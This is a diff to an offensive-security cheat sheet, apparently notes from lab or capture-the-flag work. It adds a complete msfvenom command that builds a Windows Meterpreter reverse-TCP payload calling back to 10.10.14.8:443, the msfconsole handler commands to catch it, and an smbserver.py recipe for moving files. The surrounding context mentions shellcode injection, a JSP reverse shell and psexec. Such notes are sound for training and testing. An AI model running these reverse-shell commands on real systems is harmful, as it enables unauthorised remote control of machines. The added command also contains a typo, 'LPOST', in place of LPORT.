@@ -1107,6 +1107,20 @@ Inject the payload in a trustworthy exe like whoami.exe with the help of shellte
         Outputs the payload in a raw .jsp format
     -o revshell.jsp
         Name the output file ‘revshell.jsp’
+    
+*Generate Reverse meterpreter shell*
+
+    msfvenom --payload windows/x64/meterpreter_reverse_tcp --format exe LHOST=10.10.14.8 LPOST=443 --arch x64 --platform windows --out meterpreter.exe
+
+Catch the shell
+
+    msfconsole
+    use multi/handler
+    set lhost 10.10.14.8
+    set lport 443
+    set payload windows/x64/meterpreter_reverse_tcp
+    set EXITFUNC thread
+    run
 
 
 *Msfconsole meterpreter*
@@ -1160,6 +1174,8 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-
     --hw 290 to take out 404 pages
 
 **Post Exploitation**
+
+
 
 *Linux Post Exploitation*
 
@@ -1321,10 +1337,15 @@ Back in the shell
 
     https://github.com/DominicBreuker/pspy 
 
-**Active Directory Exploitation**
+**SMB**
 
-*SMB*
+*SMBServer*
 
+use this for file exchange
+
+    smbserver.py shareName sharePath
+    smbserver.py privesc . 
+    . for current directory
 
 *SMB Analysis*
 
@@ -1387,7 +1408,7 @@ Try if you are admin
 
     psexec.py <DomainName>/<User>@<ip>
 
-*AD Exploitation*
+**AD Exploitation**
 
 Switch to Windows 
 
@@ -1703,6 +1724,9 @@ you can also write
 
   bash <script>
 
+Execute Exe
+
+    .\NAME.exe
 
 **Additional**
 
